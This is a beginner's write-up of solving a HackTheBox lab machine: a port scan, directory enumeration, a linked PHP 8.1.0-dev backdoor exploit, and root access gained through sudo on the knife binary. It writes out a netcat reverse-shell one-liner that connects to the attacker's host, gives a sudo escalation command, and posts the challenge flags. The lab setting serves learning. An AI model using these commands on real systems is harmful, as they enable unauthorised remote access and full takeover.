This is my second box I will be attempt to pwn on HackTheBox. Let's get into it!

I did an nmap scan of the box's ip. The results showed that ports 22 and 80 were open. Specifically, port 80 was being used for an Apache web server. This is probably te best lead to go on.

        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
        80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

I navigated to the web server and was greeted by an apparent medical site for a company called EMA. The web site was very bare bones. In fact, nothing on the web page was interactable.

I was at a lost at what to do, so I did some googling and learned about gobuster. It's a package that attempts directory traversal through a wordlist. The exact command I used was: gobuster dir -u 10.10.10.242 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt
I found that /server-status was a valid directory, but I didn't have permissions to access it. Directory enumeration ended up to be a dead end.

Next, I decided to take a look at the web server using inspect element. By looking at the header of 10.10.10.242 in the network tab, I was able to see that the website was being powered by PHP/8.1.0-dev.
I searched for exploits regarding that PHP version and came across this: https://www.exploit-db.com/exploits/49933. Pretty sick find.

After running the code, I got a shell. I ran "id" and found that I was logged in as a user named "james". I ran the "ls" command and saw listed directories. I tried to navgate through the directories but that didn't work. However, other commands seemed to be working fine. I decided to use a reverse shell to see if that would allow me to traverse through directories.

I looked at this website: https://pentestbook.six2dez.com/exploitation/reverse-shells for commands that can be used to create reverse shells. I used the first command underneath the bash section: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.57 1337 >/tmp/f and generated a reverse shell.

The reverse shell allowed me to navigate through the directories! I went to /home/james and saw a file called user.txt. That's the first flag: 17c3bb751e9961c0cbc0e1de916a4bd9

Now I had to do some privesc to get root. I tried sudo -l and saw this pop up:
User james may run the following commands on knife:
        
        (root) NOPASSWD: /usr/bin/knife

I ran knife -h to see what the available options were, but I didn't expect the help page to be so massive. A command that caught my eye was "knife exec". According to the knife documentation (https://docs.chef.io/workstation/knife_exec/), this command is able to run Ruby scripts. The syntax for running Ruby scripts is: knife exec -E 'RUBY CODE'

I tried to figure out how to use Ruby to elevate privileges, but then I remembered the really nifty site, gtfobins.github.io. I searched up knife and found this code: sudo knife exec -E 'exec "/bin/sh"'. Since this knife binary is able to be run as sudo by james, this command makes it so that the elevated privileges are not dropped, granting root access. 

After running the command, I ran "whoami" and saw that I was now the root user. I navigated to the root folder and got the root.txt hash: 449e1149cf6e5a01d86acfe53a80780d.

Overall, I can see why this box had a difficult rating of "easy." While attempting to solve the box, I got stuck in many places because I wasn't sure what exactly I was supposed to be looking for. However, now that I am familiar with the process, I can see how each of the steps from attaining a foothold to escalating privileges make a lot of sense.
